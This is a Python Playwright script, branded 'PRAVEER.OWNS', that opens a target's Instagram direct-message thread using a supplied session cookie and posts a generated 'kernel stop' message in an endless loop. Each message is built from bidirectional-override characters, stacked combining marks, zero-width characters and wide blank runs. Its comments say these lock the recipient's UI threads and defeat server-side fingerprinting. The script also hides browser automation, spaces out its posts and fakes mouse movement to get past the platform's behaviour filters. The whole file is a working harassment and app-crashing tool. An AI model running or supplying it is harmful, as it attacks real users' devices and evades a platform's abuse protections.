# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (GHOST-PROOF STRIKE)
# 📅 STATUS: ROLE-STABLE | GHOST-BYPASS | NATIVE-STEALTH

import os, asyncio, random, sys
from playwright.async_api import async_playwright

def get_kernel_stop_payload(target_name):
    """The Ghost-Bypass Edition: Shattered Logic to bypass server-side drops."""
    u_id = random.randint(100000, 999999)
    # 🧂 DYNAMIC SALT: Invisible characters to break server fingerprints
    salts = ["\u200b", "\u200c", "\u200d", "\u200e", "\u2060", "\u2063"]
    salt_str = "".join(random.choices(salts, k=15))
    
    headers = [
        f"⚡ 【﻿ ＳＹＳＴＥＭ　ＦＲＥＥＺＥ 】 ⚡",
        f"☣️ 『 𝕯𝕰𝕬𝕿𝕳 𝕾𝕰𝕹𝖀𝕾 』 ☣️",
        f"⚠️ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚠️"
    ]
    header = f"{random.choice(headers)}\n🆔 {u_id}{salt_str}\n"
    
    # 🏗️ OPTIMIZED DENSITY (Stay below the 120-mark drop threshold)
    z_tower = "̸" * random.randint(55, 65) 
    width_bomb = "\u2800\u00A0" * 30
    lines = [header]
    
    for i in range(80): 
        # BIDI Overrides: Reverses text rendering to lock UI threads
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("0123456789ABCDEF", k=4))
        lines.append(f"{width_bomb}{prefix}𝕻𝕬𝕻𝕬_{noise}{z_tower}")
        
    return "\n".join(lines)[:9950]

async def agent_blitz(machine_id, cookie_list, target_id, target_name):
    current_cookie = cookie_list[0].strip()

    async with async_playwright() as p:
        # Launch with native stealth to hide automation flags
        browser = await p.chromium.launch(
            headless=True,
            args=["--disable-blink-features=AutomationControlled"]
        )
        
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            viewport={'width': 1920, 'height': 1080}
        )
        
        page = await context.new_page()
        
        # Patching navigator.webdriver to 'undefined'
        await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

        try:
            print(f"📡 [M{machine_id}] Establishing Session Context...")
            await page.goto("https://www.instagram.com/robots.txt")
            await context.add_cookies([{
                "name": "sessionid", "value": current_cookie, 
                "domain": ".instagram.com", "path": "/", "secure": True
            }])

            print(f"📡 [M{machine_id}] Entering Chat: {target_id}...")
            # 'networkidle' ensures React components are fully loaded
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="networkidle")
            
            # 🛠️ STABLE SELECTOR: Using Accessibility Role
            # This bypasses all random class name changes (e.g., xjyslct)
            box = page.get_by_role("textbox", name="Message")
            
            print(f"📡 [M{machine_id}] Scanning for UI Input...")
            await box.wait_for(state="visible", timeout=60000)
            print(f"✅ [M{machine_id}] SYNC COMPLETE. TARGET LOCKED.")

            while True:
                payload = get_kernel_stop_payload(target_name)
                
                # 'fill' injects the payload instantly (better than 'type')
                await box.fill(payload)
                await asyncio.sleep(1)
                await page.keyboard.press("Enter")
                
                print(f"💀 [M{machine_id}] Payload Delivered.")

                # ⏳ SAFETY GAP (160-200s): Crucial for 1-ID longevity
                sleep_time = random.uniform(160, 200)
                print(f"⏳ Stealth Cooling: {int(sleep_time)}s...")
                
                # Mimic human activity (mouse moves) to satisfy behavior filters
                for _ in range(5):
                    await asyncio.sleep(sleep_time / 5)
                    await page.mouse.move(random.randint(100, 700), random.randint(100, 700))

        except Exception as e:
            print(f"❌ [M{machine_id}] Fatal: {str(e)[:100]}")
            await page.screenshot(path="debug_fail.png") # Local debug image
            await browser.close()
            sys.exit(1)

if __name__ == "__main__":
    m_id = int(os.environ.get("MACHINE_ID", "1"))
    cookies = os.environ.get("SESSION_ID", "").split(",")
    t_id = os.environ.get("GROUP_URL", "").strip()
    t_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    asyncio.run(agent_blitz(m_id, cookies, t_id, t_name))
